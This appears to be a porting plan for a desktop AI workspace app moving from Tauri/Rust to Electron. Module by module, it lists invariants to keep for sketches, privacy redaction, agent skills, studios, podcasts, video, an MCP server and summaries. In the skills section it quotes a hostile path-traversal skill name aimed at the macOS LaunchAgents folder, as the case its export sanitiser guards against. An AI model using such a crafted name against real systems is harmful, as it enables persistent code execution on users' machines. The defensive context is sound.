The sketch document format: model (5 named inks, integer coords on a bounded page), forgiving script parser with all-or-nothing validation, connector routing/reflow, to_script round-trip, geometric layout checker, hand-drawn wobbly SVG renderer (seeded per-id RNG), DAG auto-layout (layout_graph), and PNG rasterization via resvg.

**Replacement:** ONE shared TypeScript library consumed by both the renderer's sketch editor and main-process agent tools — src/viewers/sketch/model.ts already twins routeBetween/CONNECT_GAP, so the port should MERGE the two implementations; rasterize SVG→PNG with @resvg/resvg-js (prebuilt napi binary, accepts font buffers replacing fontdb).

**Must preserve:**
- The model NEVER writes SVG path data (measured failure mode of model-authored <path>); it writes 'rect 250 400 320 130 blue "label"' and this module emits geometry
- Whole-script atomicity: any bad line applies NOTHING and every error is reported at once (max 12), with SCRIPT_HELP appended — the model repairs in one pass
- Parser is forgiving on input (positional or x=250 named spellings, colour near-misses mapped: magenta→pink, teal→green...) but strict on validation; unknown colours are errors, never silent substitution
- A 'canvas' line takes effect for lines BELOW it because coordinates clamp at parse time against the current page
- Pass-1 projects ids (#1/#2 = shapes this script creates) and counts deletions/clear so the 400-element ceiling judges what the page WILL hold
- route/edge_point: connector endpoints belong to the SHAPE (slab method, gap grows the box); NOTHING is clamped — clamping was how layout_graph's fifth column lost its arrows; zero-length direction returns centres (the NaN-as-i32 bug)
- CONNECT_GAP=8.0 must equal the editor's constant or every agent/editor alternation rewrites the same connector
- layout_report is the agent's eyes: overlaps, off-page (40u slack), unlabelled shapes, arrows stopping short — exact geometry, phrased as actionable instructions, because small local models can't read rasters
- to_script renders pen strokes as a summary line (a hundred points is not editable text); arrows with <2 points are skipped, never indexed into (renderer must not panic on documents somebody else wrote)
- Rendering is theme-fixed to light-paper tokens (an exported file has no app theme); wobble is seeded from the element id so re-renders are stable
- to_png empties resvg's href resolvers so no URL can ever resolve; raster capped at RASTER_MAX_W
- layout_graph: layered columns, ink cycles the 5-pen wheel per layer, terminal nodes become filled ellipses, canvas grows rather than squeezing labels, edges with invented endpoints dropped

**Gotchas:**
- The renderer and this module must agree to the UNIT on connector routing or files rewrite themselves in a loop — merge the twins, don't port both
- Ink hex values are copies of tokens.css light-theme values; a palette change must update both
- Caps (400 elements, 2000 points, 200 label chars, 600 script lines) exist so a looping model can't write a 40MB file — keep all of them

**Native/Tauri surface:** resvg + tiny_skia + usvg fontdb (bundled font database)

### `src-tauri/src/commands/privacy.rs` — 1831 LOC → electron-main (6 d)

The privacy gatekeeper's Rust half: compiled Aho-Corasick redact/restore engine over the room's entity map, the cached resolved policy every outbound seam consults, 8 settings/preview/scan commands, and the background per-file privacy scanner driving the sidecar's /privacy_scan.

**Replacement:** TS module in Electron main holding the policy cache and mechanical redactor (longest-first case-insensitive matching via a sorted alternation regex or the modern-ahocorasick npm package), injected into every sidecar request body exactly as inject_policy does today; the scanner loop becomes an async task in main calling the existing sidecar /privacy_scan; the sidecar's privacy.py already implements the twin mechanics.

**Must preserve:**
- Substring matching, NOT word-boundary — owner decision left deliberately: '[Person B]chmark' is accepted so '+9725551234' and 'BenReich' can never leak; the test substring_matching_over_redacts_but_never_leaks pins both properties any fix must keep
- Non-ASCII rules get explicit lower/upper case variants because ascii-only folding diverged from the sidecar's re.I ('José' leaked in other capitalizations); restore always emits the room's canonical spelling
- An EMPTY entity map still attaches an active policy — concepts (live guard) and image-stripping engage without any entities; only remote_seam_redactor tests emptiness
- The remote-connector seam ignores the on/off switch (hard non-local destination); the web seam (mask_outbound_web, outbound_url_hides) follows the switch; URLs with percent-encoded protected names are REFUSED not masked
- Fail-closed policy refresh: a failed entity-map read keeps the rules already in force (Computed::Partial) — clearing the cell opened every seam at once from one transient read
- Scanner pins room path AND epoch before every read/write; findings from a swapped room are dropped, never filed in the wrong room
- Scanner pauses while the user chats (cancels registry non-empty), remembers failed files per generation to avoid an infinite loop, and only writes the scan row when the sidecar says complete:true
- MIN_PROTECTED_CHARS=2 enforced at add AND at use; MAX_PRIVACY_CONCEPTS=20 REFUSED over-cap (never silently take(20))
- rules_sha covers concepts+scanner version only — entity-map changes deliberately do not stale scans
- payload() withholds guard_model while a scan runs so live-guard calls don't queue behind it; 'relayed' flag tells the sidecar when Ollama points at another machine
- Global default file (app-data privacy.json): absent = ON; last_scan_error survives for mount-time reads because the terminal event fires once

**Gotchas:**
- Every new sidecar gateway MUST call the inject_policy equivalent — the 2026-07-25 leak was a gateway that didn't; in Electron there will be more seams (main-process fetch, MCP client) to cover
- JS regex 'iu' folding differs from both aho-corasick ASCII folding and Python re.I — port the explicit case-variant table, don't trust the engine
- The policy cell is process-global with test-lock discipline; in main it becomes a singleton but the sidecar must keep receiving policy per-request (sidecar restarts lose nothing)
- connector_args_masked is per-connector since 2026-08-03 (weakest answer wins across remote connectors); the panel is TOLD, it cannot derive this from effective_on

**Native/Tauri surface:** tauri::AppHandle.path().app_data_dir(); tauri::Emitter (privacy-scan events); tauri::async_runtime::spawn; tauri::Manager/State

### `src-tauri/src/commands/skills.rs` — 1811 LOC → electron-main (7 d)

Agent Skills: validation, encrypted CRUD (14 commands), SKILL.md folder import/export, AI skill composition with source-file snapshots, and agent-side tools including consent-gated script execution in a decrypted temp workspace.

**Replacement:** TS module in Electron main over better-sqlite3 for CRUD/validation; folder import/export via node:fs; script runs via child_process.spawn in an app-cache workspace with the same consent flow; keep the hand-rolled minimal YAML frontmatter parse/render (block scalars, quote unescaping) rather than a YAML lib to preserve byte-identical exports.

**Must preserve:**
- require_skill existence check before UPDATE/enable/disable — SQLite UPDATE matching no rows succeeds, so save/enable used to report success on a deleted skill (SKILL_GONE)
- agent binding validated against SKILL_AGENT_IDS at EVERY seam (create, update, model save, folder import) — a typo'd owner is a skill offered to no agent, silently, forever; empty = general
- normalize_skill_path: no absolute paths, no non-Normal components, trailing '/' refused, a//b collapsed; but DELETE matches on the looser stored_resource_key so legacy rows stay deletable
- check_resource_paths: no path may be a folder-prefix of another (byte-compared, ASCII case-insensitive because macOS folds case) — checked at import, compose, export AND before script-run materialization
- Import skips dotfiles and refuses symlinks; caps 250 files / 128MB total / 32MB per resource; skill.md accepted case-insensitively; replace-import keeps the id + enabled state and deletes resources the new folder dropped
- Export sanitizes the skill name via safe_export_name (SEC-1: hostile .roomai row named '../../Library/LaunchAgents/x') and removes the half-written folder on error
- Every agent-authored or agent-edited skill returns to DISABLED for human review; agent delete_skill requires the confirm_destructive consent card
- Script runs: workspace claimed in live_skill_runs BEFORE mkdir, 0700 perms, Drop cleanup, and sweep_orphan_skill_runs on each run because a SIGKILL leaves decrypted room snapshots on disk
- compose_skill: 2-attempt loop feeding validation errors (name clash, bad paths, oversize) back to the model; source snapshots bundled at reserved references/source-files/ paths with per-file char budgets and injection-resistant prompt framing

**Gotchas:**
- render_skill_md omits 'agent:' when empty to stay byte-identical to pre-2026-07-24 exports — a YAML lib would reformat and break that
- skill_resource_kind is decided by the FIRST path segment (scripts/references/assets/agents)
- The compose model resolution accepts external CLI engines with zero local models installed — don't gate on Ollama being up

**Native/Tauri surface:** tauri::Window/Emitter (skills-changed); tauri::AppHandle.path().app_cache_dir(); std::os::unix::fs::PermissionsExt (0700 workspaces)

### `src-tauri/src/commands/moonshot/graph.rs` — 1163 LOC → electron-main (3 d)

The room graph builder: files+memories as nodes, 6 edge kinds (derived, same_page, mentions, cited, same_site, similar) with a trust order, rank-based similarity from embeddings with TF-IDF fallback, and deterministic output.

**Replacement:** Pure TS in Electron main reading embeddings/citations/derivation rows from better-sqlite3; port the constants and every seed test verbatim — the tuning history (adaptive floors, caps) is the value.

**Must preserve:**
- Only 'similar' is INFERRED; the other five are facts the room can prove, and when two relations hold for a pair only the most-trusted is drawn (EDGE_KINDS order)
- Similarity is per-file top-K (3) by RANK, union not mutual, never an absolute cosine cutoff — mean-pooled doc vectors in one room all clear 0.55, which linked 163 of 171 pairs; floors (vec 0.45, kw 0.08) are sanity checks so a genuinely unrelated file stays isolated
- link_strength maps each signal's own floor to 0.3 and perfect to 1.0 — raw keyword cosines drew invisible hairlines labelled '10% similar' that the viewer's edge cap dropped first
- UNBOUNDED FACTS are still hairballs: mentions capped (top 2, rarest-word document-frequency ≤0.15, stem ≥6 chars — what stops 'Notes.md' linking to everything), cited capped (answers with >4 sources are research not relation; top 3 partners per file — measured: 20 files produced all 190 links), same-site groups >8 are a scrape
- index_terms is deliberately NOT question_terms (which returned the first 24 words — positional, not distinctive); TF-IDF keeps 40 distinctive terms, shared-term tiebreak by term name for deterministic tooltips
- GRAPH_MAX_FILES=60 keeps the O(n²) pairing bounded; the same room always produces the same payload (tested)

### `src-tauri/src/commands/sketch.rs` — 1014 LOC → electron-main (3 d)

Sketch page commands (create/save/export SVG/PNG) and the drawing agent's two tools (draw = whole script per call, read_drawing = script + measured layout report + optional raster), with name resolution and empty-sketch claiming.

**Replacement:** TS in Electron main over the shared sketchdoc TS library; agent tools registered in the rewritten tool dispatcher; events become webContents.send with identical payloads.

**Must preserve:**
- resolve distinguishes NotFound (may create) from Ambiguous (must go back to the model) — matching on Err(_) once created a third drawing while the meant one sat untouched
- draw with a new name CLAIMS the newest EMPTY sketch and renames it (the 'New sketch then ask' flow, live QA 2026-08-13) — never repurposes a sketch with anything on it; ambiguous names claim nothing
- save_sketch is a plain content write: no per-stroke version history, no reindex, no room-files-changed broadcast (those made the canvas stall); history snapshot ONCE per editing session via the snapshot flag ('Before you drew'); document parsed BEFORE writing
- tool_draw emits agent-open-file (show the user the drawing they asked for), sketch-drawn with the WHOLE doc JSON (so the editor needn't re-read and clobber a concurrent stroke), and room-files-changed
- read_drawing attaches the PNG only when the chat engine reads images AND (model is local OR privacy door off) — a cloud model is told plainly the picture was withheld; render failure never loses the text report
- New sketches are section-only (Sketches, not Library) whoever made them; exports (.svg/.png) carry extracted label text so they stay searchable
- Tool descriptions deliberately compressed (billed every turn); full grammar returned via SCRIPT_HELP only on parse failure; exactly TWO tools — a third see_drawing was removed as a near-duplicate a 4B picks wrongly

**Gotchas:**
- list_sketches depends on list_files being newest-first (take_empty_sketch picks the newest blank)
- SKETCH_MIME is application/json but viewers key on the .sketch extension

**Native/Tauri surface:** tauri::Emitter (agent-open-file, sketch-drawn, room-files-changed); tauri::State

### `src-tauri/src/commands/story.rs` — 930 LOC → electron-main (3 d)

The Create page's Story tab: cast/shot-list CRUD (20 commands), room picture/document pickers with thumbnails, cast extraction from documents via model with pattern fallback, script-to-shots splitting with cast auto-assignment, and shot prompt assembly.

**Replacement:** TS in Electron main; thumbnails (192px JPEG, cached by file id) via sharp (prebuilt); cast reading already calls the sidecar's /knowledge_extract; shotsplit port is pure logic.

**Must preserve:**
- story_board is ONE round trip (cast+lists+shots) with fallback to the most-recently-touched list — a partial answer is useless
- story_text_from_file returns the WHOLE text, never clamped — the '#minutes only does 5 minutes' lesson, stated in the comment
- story_read_cast_file: the room's model reads via /knowledge_extract; on no-model or failure it falls back to the Rust pattern reader and SAYS SO (read_by + fell_back) — pattern output must never be passed off as the model's; writes NOTHING (preview-then-keep)
- story_plan_split: the script's own **00:00–00:15** chunks WIN over length-cutting; minutes=0 is a half-typed field, not a request for one shot; seconds clamped 1–60
- snap_seconds snaps each shot to the video model's legal durations (Veo: 4/6/8) from media_limits
- story_apply_split APPENDS (never deletes paid work) and runs assign_cast: whole-word name matching (full + first name; 'Noa' must not match 'Noah'/'no answer'), shots naming nobody INHERIT the previous shot's cast (screenplay pronoun convention), shots before any name get nobody; the empty-slice bug here caused a different lead per scene
- shot_prompt: logline + 'Name — description' per cast member + action, because the portrait holds the face and the text says what they're DOING
- MAX_SHOT_CAST=4 (own ceiling under every published reference limit); pickers capped (150 pictures, 200 docs), newest first

**Gotchas:**
- Thumbnail cache is keyed by file id and never invalidated — safe only because file bytes are immutable
- names_appear does byte-indexed boundary checks — port carefully for multi-byte text (current code checks bytes as chars)

**Native/Tauri surface:** image crate (JPEG thumbnail encode)

### `src-tauri/src/commands/studios.rs` — 844 LOC → electron-main (3 d)

The shared Studio pipeline (gather text, resolve model, HTML-first authoring with structured fallback, cancel wiring, save through the Artifact funnel) plus preview plumbing: open-in-real-browser temp files and the in-app staged-HTML store.

**Replacement:** TS in Electron main: run_studio_core as an async function over the ported engine client; open_html_in_browser via shell.openPath/openExternal on a temp file with the same sweeps; stage_preview_html backing a custom protocol handler (protocol.handle) replacing roomdoc://.

**Must preserve:**
- gather caps: file scope 12KB, room scope 12KB at 1500/file, explicit refs 3000/file; refs win over scope; summary file excluded from its own input
- fill_template substitutes in ONE left-to-right pass, never rescanning substituted text — chained .replace() spliced a file named __CARDS__'s own deck into its <title>
- SELF_CONTAINED_HTML_RULES is the ONE prompt allowed to name colours/fonts (on this path the model IS the template): keys on html[data-theme="dark"] — NEVER prefers-color-scheme, which follows the Mac instead of the room — and its six hex values are copies of tokens.css pinned by test; fallback_system prompts ask for content only (the Rust template owns every pixel)
- structured_first (podcast only): turns must survive as DATA because voices are assigned per line; HTML-first made most episodes unrecordable
- guard_commit at the WRITE, not just around model calls — live QA 2026-08-03: Studio created files after the UI said the run stopped; the Artifact funnel re-reads cancel immediately before commit and a re-run versions the deck instead of a '(2).html' twin
- register_studio_cancel puts the flag in the SAME registry as chat Stop and links parent_run — a Studio started by an agent tool is a CHILD of the ask and inherits its Stop (owner replacement #3)
- Local/cloud disclosure: the 'local' flag is EMITTED alongside the step words (declared_for, which catches '<size>-cloud' spellings) — the frontend must not grep English for 'leaves this Mac'
- open_html_in_browser is the ONE place page content touches unencrypted disk/network, user-triggered; sweeps: blanket at startup/exit, grace-based mid-session (eager sweep races /usr/bin/open which returns before the browser reads the file)
- stage_preview_html: monotonic tokens, oldest evicted at 24 — clearing the whole map took down the page the user still had open
- after_save hook failure degrades the extras and never reports a visibly-succeeded build as failed; logged classified (err_kind), never the raw text (can carry the artifact's name)

**Native/Tauri surface:** /usr/bin/open (subprocess); tauri::Emitter (studio-step); tauri::State<HtmlPreviews>

### `src-tauri/src/commands/studios/podcast_audio.rs` — 561 LOC → electron-main (2.5 d)

Record a podcast script as audio: every line through the speech privacy door, one cancellable sidecar /tts/podcast POST, afconvert WAV→AAC m4a, a seekable timed transcript, and the get/set-cast/preview commands.

**Replacement:** TS in Electron main: the door check per line against the ported speakable_text, the sidecar /tts/podcast call (unchanged), afconvert via child_process with temp-dir cleanup; refold/naming logic is pure and ports with its tests.

**Must preserve:**
- THE PRIVACY SEAM: an entire episode of text written FROM the user's documents goes to Microsoft's Edge TTS — every line runs through the SAME speakable_text door as one spoken sentence (internet switch, then redaction); with the door on, placeholders are SPOKEN ('Person A'), and the transcript records the redacted spoken text, never the script's original (the app must not disagree with itself about what left the Mac)
- The UI is REQUIRED to state both consequences before a build (PodcastPanel.tsx)
- MAX_PODCAST_TURNS=400 truncation is reported IN the artifact's transcript (the job card is gone tomorrow; the file is not); transcript opens with a 'synthetic voices, not a recording of people' provenance line
- afconvert m4af/aac 64k VBR-constrained; failure falls back to the WAV with honest mime/ext — a big file that plays beats no episode; ~29MB/10min WAV vs ~5MB AAC is why m4a
- Transcript rows are '[m:ss] Speaker: line' — the exact shape AudioView already parses (clickable/seekable, no new viewer); a missing offset drops the stamp rather than stamping 0
- next_take_name PROBES for a free name (re-casting keeps the previous episode; counting takes breaks after a trash/rename); bounded 2..=99 then uuid suffix
- set_podcast_cast: empty names refused, duplicate names refused (lines join to voices BY NAME — the second host would never speak); refold_speakers renames BY POSITION with the full mapping built BEFORE any turn is touched (per-host rewriting let a swap collapse every line onto one speaker)
- Three-phase locking: read locked → minutes of network unlocked → write re-pinned + re-guarded; cancel guard immediately before each side effect

**Gotchas:**
- get_podcast returns None (not Err) for a non-podcast file — the viewer asks this of whatever is open, and it covers scripts made before the table existed
- preview_podcast_voice must ride the same speech door as everything spoken — a room that cannot speak an answer must not speak a preview

**Native/Tauri surface:** /usr/bin/afconvert (subprocess); tauri::Emitter (studio-step, room-files-changed)

### `src-tauri/src/commands/moonshot/ai_actions.rs` — 539 LOC → electron-main (3 d)

The 14 AI actions (9 file-scope, 5 room-scope) catalog and runner (via sidecar /ai_action), plus memory_suggestion, suggest_file_meta, and the generic generate_ui_text conduit.

**Replacement:** TS in Electron main: catalog stays a typed constant (order is the frontend contract), runner keeps gather → resolve → cancellable sidecar POST → guard_commit → Artifact save; the prompts/schemas already live in the sidecar's /ai_action table.

**Must preserve:**
- Action order and flags are the cross-agent contract: 14 ids in menu order, needs_question only for research, needs_language only for translate (language rides the question parameter) — pinned by test
- ai_action registers in the SAME cancel registry chat's Stop uses (an unstoppable minutes-long Summarize was the bug); rollback guard before starting; the step chip is emitted UNOWNED (null ids — an AI action belongs to no conversation) with the cloud 'content leaves this Mac' disclosure
- Stop for a one-shot endpoint IS dropping the request (sidecar until_hangup cancels the engine call); Ok(None) = stopped; guard_commit re-reads the flag between answer and save
- Sidecar error codes UNKNOWN_ACTION/NEEDS_LANGUAGE/EMPTY_RESULT surface their exact message verbatim; everything else maps to the OLLAMA_DOWN/MODEL_MISSING sentinels
- Result saved through the Artifact funnel — re-running the same action over the same scope VERSIONS the file
- memory_suggestion refuses when the assistant's last message is_failure_notice — live QA: it once offered to save 'The room's revenue is 0.' extracted from Arcelle's own error notice; degrades to not-worth on any engine failure
- suggest_file_meta stays quiet under 80 chars of extracted text (metadata from a damaged extraction reads as nonsense); degrades to echoing the current name
- generate_ui_text NEVER returns Err for an unavailable model/sidecar — Ok(None) is the contract (test drives a real unreachable sidecar); it owns no per-feature prompt wording

**Gotchas:**
- refs win over scope everywhere (same rule as studios); the model-down message must stay identical to studio_flashcards' ('The local AI (Ollama) isn't running — start it and try again.')

**Native/Tauri surface:** tauri::Window/Emitter (ask-step via turn::emit_unowned)

### `src-tauri/src/commands/video.rs` — 515 LOC → python-sidecar (3 d)

Video as workable material: probe container metadata (cached in files.media_meta), trim a span to a new room file via /usr/bin/avconvert, and save a viewer-grabbed frame as a PNG room file.

**Replacement:** Probe via PyObjC AVFoundation in the sidecar (media_probe equivalent; the allowed pattern — NOT ScreenCaptureKit); trim by spawning /usr/bin/avconvert from the sidecar with 0600 temp files; save_video_frame (base64 decode + PNG magic check + insert) stays in Electron main.

**Must preserve:**
- Trim writes decrypted source AND result to owner-only (0600, create_new) temp files removed on EVERY exit path — the stated, accepted cost; playback bytes still never touch disk
- avconvert tries PresetPassthrough (no re-encode, no generation loss) then falls back to PresetHighestQuality; a missing avconvert is named plainly, never a silent fallback
- validate_span: unknown duration removes only the upper bound; over-running tail is CLAMPED (drag-to-end intent is unambiguous); <0.1s refused (avconvert happily emits zero-frame files)
- The clip inherits NO transcript (parent [m:ss] stamps would seek wrong) and gets NO recordings row (that row is the live-recording marker; an MP4 with one opens in the recording studio and parses as WAV); it's enqueued on the STT lane like a fresh import
- split_name keeps the extension's own case (IMG_0042.MOV) — extension_of lowercases and silently failed to strip; leading-dot names are whole names
- Names embed the span with hyphens not colons (Finder reads ':' as a path separator on export); available_name disambiguates repeated trims
- Room path+epoch pinned across the async gap; media_meta re-parse failure falls through to a fresh probe; probe runs on spawn_blocking (AVAsset accessors load synchronously)
- save_video_frame verifies the PNG magic bytes — storing whatever arrived would be an unevidenced success

**Gotchas:**
- Probe is deliberately one-file-at-a-time — a room-wide backfill selecting every video's bytes is an OOM (per-file blobs up to ~1GB)
- enqueue_stt keys progress by file.name AFTER available_name disambiguation, not the requested name

**Native/Tauri surface:** /usr/bin/avconvert (subprocess); AVFoundation via crate::media_probe (objc); tauri::async_runtime::spawn_blocking; tauri::Emitter (room-files-changed)

### `src-tauri/src/commands/moonshot/server.rs` — 462 LOC → electron-main (2 d)

Leash (persistent room MCP server) control — status/start/stop at two tiers, token regeneration — and the Closet (remote Ollama URL): validate, persist, and actually test the address.

**Replacement:** TS in Electron main controlling the rewritten MCP bridge (official @modelcontextprotocol/sdk server, node:http on 127.0.0.1); Closet URL normalization is a pure function; persistence stays in room settings.

**Must preserve:**
- Two tiers: 'files' (CloudAdvisor; fresh token + ephemeral port each start; allow_cloud maps to include_mcp) vs explicit 'full' opt-in (ExternalAgent; persisted leash_port=17872 + leash_token so a pasted config survives restarts); anything else falls to the safe tier
- store_bridge_if_current: after the awaited start, the bridge is stored ONLY if the same room is still open, the slot empty, and the toggle still on — under the room lock (same room→server order teardown uses) — else stopped; an unvalidated store leaks a bridge serving the NEXT room with THIS room's token
- Discovery file written ONLY for the full tier (files-tier UI promises paste-only token delivery); scope changes (including a flipped cloud sub-option) stop-and-wait then restart — the full tier rebinds the same fixed port
- regenerate_leash_token is the REVOCATION path (change_password deliberately does not rotate it); restarting the bridge severs every live connection holding the old token
- leash_identity persists port+token on first read (that stability is the feature); token lives encrypted at rest in room settings but plaintext in leash.json and pasted configs
- normalize_ollama_url: missing scheme repaired to http (the common case), whitespace/bad ports/non-http schemes refused WITH the reason at typing time; empty clears the override; stored exactly as it will be used (trailing slash trimmed)
- test_ollama_url SAVES FIRST then connects (what is tested is what is active); 'reachable but zero models' is reported as not-yet-working, never dressed as success
- Per-agent web lanes bind the external agent on the Leash too (owner decision 2026-07-30: the toggle means 'this room does not do that')

**Gotchas:**
- The bridge itself (room_mcp) is another subsystem — this file is only the control plane, but its identity/teardown invariants constrain that rewrite

**Native/Tauri surface:** tauri::AppHandle (bridge start); tauri::State

### `src-tauri/src/commands/vision.rs` — 415 LOC → python-sidecar (2 d)

Image grounding: normalize images to a 1000×1000 stretched PNG (making pixel and 0-1000 conventions coincide), the Qwen-VL grounding prompt/schema, multi-convention box parsing, the locate_in_image command (via sidecar /vision_locate), and the is_locate_intent trigger heuristic.

**Replacement:** The canvas work (prepare, prompt, schema, parse) already lives in the sidecar's /vision_locate (Pillow); port the remaining Rust bits — grounding_pick model selection, vision_door_block sentinel mapping, ground_prepared_image for the agent's mark_image path, and is_locate_intent — into the sidecar plus a thin main-process picker.

**Must preserve:**
- VISION_SQUARE=1000 stretch (not aspect-fit): pixel and 0-1000 normalized coordinates coincide, and it pre-empts the model's own square-padding that dragged boxes downward; boxes are drawn back on the ORIGINAL via normalized coords so the stretch cancels exactly
- parse_boxes handles bbox_2d/bbox (pixel), box_2d (Google y-first 0-1000), box; scale disambiguation: values overshooting image dims ×1.05 mean the model answered in 0-1000 space anyway (qwen2.5vl on small images); <think> spans stripped; scans up to 8 '[' candidates with a streaming deserializer
- Failure honesty: no groundable model → NO_VISION_MODEL sentinel (maps to a one-click pull) but ONLY when that's the whole story — when the privacy door is what strips the pixels, vision_door_block names the switch instead
- boxes are decoded with serde error surfaced, NOT unwrap_or_default — a shape drift must read as a bug report, not 'could not locate that in this image'
- is_locate_intent is asymmetric (false positive costs a multi-GB model load, false negative is free): strong marking verbs always fire, weak verbs need an image reference, non-image targets (pdf/doc) veto
- vision_keep_alive shortens keep_alive on low-RAM Macs (HLT-5)

**Gotchas:**
- Ollama only decodes PNG/JPEG — WebP/HEIC must be transcoded or grounding fails with 'unknown format'
- The viewer's measured imgWidth/imgHeight args were deliberately REMOVED from the signature; do not re-plumb them

**Native/Tauri surface:** image crate (transcode/resize); imagesize

### `src-tauri/src/commands/summarize.rs` — 387 LOC → electron-main (1.5 d)

Room summary: per-file one-liners via sidecar /summarize_file, the reduce (purpose + suggested questions) via /combine_summary, and deterministic assembly of the single canonical 'Room summary.html' written into the room.

**Replacement:** TS in Electron main: keep the deterministic HTML assembly (escaped, themed via the ported doc_hero/html_document helpers) and the two thin sidecar calls; the model compute is already fully in the sidecar.

**Must preserve:**
- ONE canonical overwrite-in-place summary file, versioned by ADD-2 — never 'Room summary (2).html'; the legacy 'Room summary.md' is TRASHED with TrashActor::App('summarize_room') (visible, undoable — the app removing a file the user never asked it to remove)
- is_summary_file excludes the room's own summary from its own input, matching source=='generated' so a user file sharing the name is NOT excluded
- existing_id is RE-CHECKED (trash-aware) after the minutes-long reduce — the user may have deleted the old summary mid-run; store_file_bytes writes by id and would silently fill the trashed row
- pin (originating room path) guards EVERY room access; the reduce runs over ONLY the ≤50 summarized files' one-liners while the name-only tail is appended after (CHG-24: never crowd the 8K context)
- Error rule via sentinels: 502 → OLLAMA_DOWN/MODEL_MISSING:<model> only for fatal engine failure; the questions call swallows to []
- File list is deterministic (never invented by the model); everything HTML-escaped; capped rooms say so in the page

**Gotchas:**
- A dead summarize-progress emit was removed — don't reintroduce it; progress rides job-progress from the deep-summary job

**Native/Tauri surface:** tauri::Emitter (room-files-changed)

### `src-tauri/src/commands/create.rs` — 383 LOC → electron-main (1 d)

The Create page's model catalog: which connected models can actually produce images/video (from OpenRouter output_modalities, never slug matching), with every exclusion returned as an explained row.

**Replacement:** Pure TS function in Electron main over the ported provider-catalog module (list_provider_models + media_limits); trivial logic, port the tests.

**Must preserve:**
- Capability comes ONLY from architecture.output_modalities — 'flux'/'image'/'vision' appear in slugs of models that merely read pictures
- Models absent from the /images//videos media tables are dropped ONLY when the table actually LOADED — acting on a failed fetch would empty the page on every network hiccup and blame the models (this is why openrouter/auto was removed: declares image output on chat but has no media endpoint)
- Exclusions are returned with reasons per engine (claude/codex CLI: vision-in no image-out; ollama: chat API can't reach drawing models) — an empty shelf must explain itself
- any_provider=false vs error are different sentences ('connect a provider' vs 'couldn't reach OpenRouter')
- Routers (openrouter/auto* vendor prefix — order only, never capability) sort last; output_price passed verbatim, never converted to a per-picture figure the room invented
- ensure_media_limits awaited BEFORE building the shelf so the seconds picker can't change under the user's hand

**Gotchas:**
- engine_label looks up the DECLARED table directly, not declared_for, which falls back to Ollama for unknown ids

### `src-tauri/src/commands/studios/podcast.rs` — 355 LOC → electron-main (1 d)

Podcast-script studio: STRUCTURED-FIRST spec (title/hosts/turns schema) and store_podcast, which persists the script as data beside its page so voices can be cast and audio rendered without re-asking the model.

**Replacement:** TS spec + store hook writing the podcasts table rows and seeding distinct voices from the room's last-known catalog.

**Must preserve:**
- structured_first=true is the artifact's whole point: turns that only exist as markup cannot be spoken; also the more reliable path on a 4B (four-field schema vs authoring a styled page)
- Hosts roster is asked for EXPLICITLY up front — 'Ada' in turn 1 and 'Ada Lovelace' in turn 7 otherwise produces two hosts, one voiceless; speaker is the join key
- line must NOT begin with the speaker's name (the voice would announce itself before every line) — asked for in the schema description AND stripped defensively on the way in
- page_role kept though unused (structured_first skips HTML) so a future artifact copying this spec isn't shown an empty field as if normal
- after_save seeds DISTINCT voices per host — the same voice twice makes a two-host script one narrator reading a dialogue

### `src-tauri/src/commands/artifact.rs` — 345 LOC → electron-main (1.5 d)

ART-1: the artifact write funnel every AI-generated file passes through — stage into staged_artifacts, validate (empty refused), read the cancel token IMMEDIATELY before commit, commit as one transaction that VERSIONS an existing artifact instead of creating a twin; carries provenance (agent/tool/run/source file ids).

**Replacement:** TS builder class in Electron main over the ported db layer's stage/commit transactions (better-sqlite3 is synchronous, which makes the stage→check-cancel→commit window even tighter than the Rust original).

**Must preserve:**
- This is the safety net standing in for 'ask before AI edits' being OFF (owner decision): there is NO way to get generated bytes into files without staging — a crash or Stop between stage and commit leaves the library untouched, orphans swept on next room open
- The cancel flag is read ONCE, between staging and commit: earlier leaves a window where Stop is honoured everywhere except the write; later could only report a saved file as unsaved (a cancel arriving after commit does not unsay it — both directions tested)
- A cancelled parent run blocks the CHILD's artifact write via the cancel tree — a Stop on the ask stops the Studio build it started, before its file lands
- Regeneration under the same name is a new VERSION (Written.versioned=true so callers say 'the previous one is in History' instead of implying a brand-new file); restore is itself undoable and provenance/credit follows the restore (restoring a hand-typed state CLEARS the AI credit — a stale credit is the same lie as a missing one)
- Empty/nameless artifacts refused at the door (an empty file in the library reads as finished work — anti-fabrication); extension-less notes default to .md in ONE place
- indexed_as lets a .sketch index its labels instead of its JSON source (coordinates in search results); provenance carries source file IDS only, never content (tested against the raw row)

**Gotchas:**
- The stopped-Err message wording ('nothing was written to the room') is asserted by callers' UX and tests — keep it
- discard_staged on failure is best-effort; the sweep on next room open is the backstop

### `src-tauri/src/commands/studios/flashcards.rs` — 309 LOC → electron-main (1 d)

Flashcards studio: the spec for the shared pipeline plus the built-in fallback template (CSS-only flip cards).

**Replacement:** TS spec object + template-string renderer; identical HTML output.

**Must preserve:**
- Fallback template is CSS-only flip with NO JavaScript — WKWebView refuses inline scripts in the network-blocked HtmlView iframe, which left a JS-built deck blank (Electron's sandboxed iframe may differ, but the no-JS template is the safe portable choice)
- The flip checkbox is off-screen but NOT hidden — display:none removed it from the tab order, making the deck mouse-only with nothing for a screen reader to operate
- Cards with empty q or a are dropped; zero usable cards is an Err the frontend toasts, not an empty page

### `src-tauri/src/commands/studios/mindmap.rs` — 240 LOC → electron-main (0.75 d)

Mind-map studio: spec plus the built-in collapsible-tree fallback template.

**Replacement:** TS spec + renderer; keep the clean-hierarchy choice (no force-layout lib — the RoomMap viewer owns the physics constellation).

**Must preserve:**
- Nodes name their parent by exact label (root or another node's label); root defaults to the scope label when the model omits it
- Same graceful-degradation contract as flashcards: unusable JSON → Err, HTML path falls back to template

### `src-tauri/src/commands/moonshot/front_page.rs` — 227 LOC → electron-main (1 d)

The instant, model-free landing view (recent files/chats, memories, cached suggestions, counts) plus lazy AI starter-question generation via the sidecar's /label.

**Replacement:** TS in Electron main over better-sqlite3; pure front_page_of function kept testable; suggestions call the existing sidecar /label.

**Must preserve:**
- front_page never blocks unlock: reads stored rows + cached suggestions only
- file_count uses room_file_count with the SAME trash predicate as list_files — the count and the strip may never disagree (a bare count(*) once reported 1 file over an empty list and ViewerPane's empty-room gate held); count errors PROPAGATE, never fall back to 0 ('0 files' is a claim about the room)
- Room count ≠ Library badge: a section-only sketch is in the room count but not the Library (owner ruling 2026-08-03, pinned by test)
- Suggestions cache in meta is written ONLY if the same room path is still open after the minutes-long model call (one room's questions were once filed in another); offline/empty result degrades to the cached list
- /label is resilient by design — any engine failure is 200 {questions: []}, so an Err here means only a dead sidecar

